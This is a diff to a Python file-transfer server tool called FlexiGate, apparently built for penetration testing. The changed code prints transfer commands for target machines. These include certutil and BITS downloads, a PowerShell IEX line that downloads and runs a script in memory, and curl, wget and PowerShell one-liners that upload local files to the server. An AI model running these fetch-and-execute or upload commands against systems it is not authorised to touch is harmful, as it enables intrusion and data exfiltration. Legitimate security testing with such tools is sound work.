@@ -125,27 +125,66 @@ def show_commands(ip_address, port, file_name=None, current_directory=None):
     if file_name:
         file_path = os.path.join(current_directory, file_name)
         if os.path.exists(file_path) and os.path.isfile(file_path):
-            # Correct file path and show download commands
+            # File exists: show download commands
             full_path = os.path.relpath(file_path, app.config['UPLOAD_FOLDER'])
             print(colored(f"\nCommands to download the file '{file_name}':\n", 'cyan', attrs=['bold']))
-            print(colored("### Linux Command to Download:", 'yellow', attrs=['bold']))
-            print(colored(f'curl http://{ip_address}:{port}/{full_path} -o {file_name}\n', 'white'))
-            print(colored("### Certutil Command to Download:", 'yellow', attrs=['bold']))
+            
+            # Common Commands
+            print(colored("### Common Commands:", 'yellow', attrs=['bold']))
+            print(colored("1. Download using curl (Linux/Windows):", 'green'))
+            print(colored(f'curl -L http://{ip_address}:{port}/{full_path} -o {file_name}\n', 'white'))
+            
+            # Linux Commands
+            print(colored("### Linux Commands:", 'yellow', attrs=['bold']))
+            print(colored("1. Download using wget:", 'green'))
+            print(colored(f'wget http://{ip_address}:{port}/{full_path} -O {file_name}\n', 'white'))
+            
+            # Windows Commands
+            print(colored("### Windows Commands:", 'yellow', attrs=['bold']))
+            print(colored("1. Download using Start-BitsTransfer:", 'green'))
+            print(colored(f'Start-BitsTransfer -Source "http://{ip_address}:{port}/{full_path}" -Destination "C:\\users\\public\\downloads\\{file_name}"\n', 'white'))
+            print(colored("2. Download using Certutil:", 'green'))
             print(colored(f'certutil -urlcache -split -f "http://{ip_address}:{port}/{full_path}" "C:\\users\\public\\downloads\\{file_name}"\n', 'white'))
-            print(colored("### PowerShell Command to Download:", 'yellow', attrs=['bold']))
-            print(colored(f'$fileUrl = "http://{ip_address}:{port}/{full_path}"; Invoke-WebRequest -Uri $fileUrl -OutFile "C:\\users\\public\\downloads\\{file_name}"\n', 'white'))
+            print(colored("3. Download and Execute in Memory using PowerShell:", 'green'))
+            print(colored(f'IEX (New-Object Net.WebClient).DownloadString("http://{ip_address}:{port}/{full_path}")\n', 'white'))
         else:
-            print(colored(f"File '{file_name}' does not exist in the current directory.\n", 'red'))
+            # File does not exist: show upload commands
+            print(colored(f"\nThe file '{file_name}' does not exist in the current directory.\n", 'red'))
+            print(colored("Assuming you want to upload the file to FlexiGate.\n", 'cyan', attrs=['bold']))
+            
+            # Common Commands
+            print(colored("### Common Commands:", 'yellow', attrs=['bold']))
+            print(colored("1. Upload a file using curl (Linux/Windows):", 'green'))
+            print(colored(f'curl -F "file=@{file_name}" http://{ip_address}:{port}/upload\n', 'white'))
+            
+            # Linux Commands
+            print(colored("### Linux Commands:", 'yellow', attrs=['bold']))
+            print(colored("1. Upload a file using wget (if supported):", 'green'))
+            print(colored(f'wget --post-file={file_name} http://{ip_address}:{port}/upload\n', 'white'))
+            
+            # Windows Commands
+            print(colored("### Windows Commands:", 'yellow', attrs=['bold']))
+            print(colored("1. Upload a file using PowerShell (One-liner):", 'green'))
+            print(colored(f'$filePath = "C:\\\\path\\\\{file_name}"; $serverUrl = "http://{ip_address}:{port}/upload"; $boundary = [System.Guid]::NewGuid().ToString(); $LF = "`r`n"; $headers = @{{"Content-Type" = "multipart/form-data; boundary=$boundary"}}; $fileBytes = [System.IO.File]::ReadAllBytes($filePath); $fileContent = [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($fileBytes); $body = "--$boundary$LF" + "Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"$LF" + "Content-Type: application/octet-stream$LF$LF" + $fileContent + "$LF--$boundary--$LF"; Invoke-RestMethod -Uri $serverUrl -Method Post -Headers $headers -Body ([System.Text.Encoding]::GetEncoding("iso-8859-1").GetBytes($body)) | Write-Output\n', 'white'))
+
     else:
+        # No file specified: show default upload commands
         print(colored("\nUse the following commands to send and download files:\n", 'cyan', attrs=['bold']))
-        print(colored("### PowerShell Command to Upload:", 'yellow', attrs=['bold']))
-        print(colored(f'$filePath = "C:\\path\\file.txt"; $serverUrl = "http://{ip_address}:{port}/upload"; $boundary = [System.Guid]::NewGuid().ToString(); $LF = "`r`n"; $headers = @{{"Content-Type" = "multipart/form-data; boundary=$boundary"}}; $fileBytes = [System.IO.File]::ReadAllBytes($filePath); $fileContent = [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($fileBytes); $body = "--$boundary$LF" + "Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"$LF" + "Content-Type: application/octet-stream$LF$LF" + $fileContent + "$LF--$boundary--$LF"; Invoke-RestMethod -Uri $serverUrl -Method Post -Headers $headers -Body ([System.Text.Encoding]::GetEncoding("iso-8859-1").GetBytes($body)) | Write-Output\n', 'white'))
-        print(colored("### Linux Command to Upload:", 'yellow', attrs=['bold']))
+        
+        # Common Commands
+        print(colored("### Common Commands:", 'yellow', attrs=['bold']))
+        print(colored("1. Upload a file using curl (Linux/Windows):", 'green'))
         print(colored(f'curl -F "file=@/path/to/file.txt" http://{ip_address}:{port}/upload\n', 'white'))
-        print(colored("### Command to List Files:", 'yellow', attrs=['bold']))
-        print(colored(f'curl http://{ip_address}:{port}/files\n', 'white'))
-        print(colored("### Command to Download a File:", 'yellow', attrs=['bold']))
-        print(colored(f'curl http://{ip_address}:{port}/<file_to_download> -o <file_to_store>\n', 'white'))
+        
+        # Linux Commands
+        print(colored("### Linux Commands:", 'yellow', attrs=['bold']))
+        print(colored("1. Upload a file using wget (if supported):", 'green'))
+        print(colored(f'wget --post-file=/path/to/file.txt http://{ip_address}:{port}/upload\n', 'white'))
+        
+        # Windows Commands
+        print(colored("### Windows Commands:", 'yellow', attrs=['bold']))
+        print(colored("1. Upload a file using PowerShell (One-liner):", 'green'))
+        print(colored(f'$filePath = "C:\\path\\file.txt"; $serverUrl = "http://{ip_address}:{port}/upload"; $boundary = [System.Guid]::NewGuid().ToString(); $LF = "`r`n"; $headers = @{{"Content-Type" = "multipart/form-data; boundary=$boundary"}}; $fileBytes = [System.IO.File]::ReadAllBytes($filePath); $fileContent = [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($fileBytes); $body = "--$boundary$LF" + "Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"$LF" + "Content-Type: application/octet-stream$LF$LF" + $fileContent + "$LF--$boundary--$LF"; Invoke-RestMethod -Uri $serverUrl -Method Post -Headers $headers -Body ([System.Text.Encoding]::GetEncoding("iso-8859-1").GetBytes($body)) | Write-Output\n', 'white'))
 
 # Function to display listening interfaces
 def show_interfaces(interfaces, port):
@@ -229,7 +268,8 @@ def cli_thread(upload_folder, ip_address, port, interfaces):
                 print("cd <path> - Change directory")
                 print("cd .. - Go up one directory")
                 print("show - Display the upload, download, and list commands")
-                print("show <file> - Show download command for the specified file")
+                print("show <Existing-file> - Show download command for the specified file")
+                print("show <Non-Existing-file> - Show upload command for the specified file")
                 print("interfaces - Show the current listening interfaces")
                 print("interface <interface-name> - Set the specified interface for FlexiGate")
                 print("exit - Exit the CLI\n")
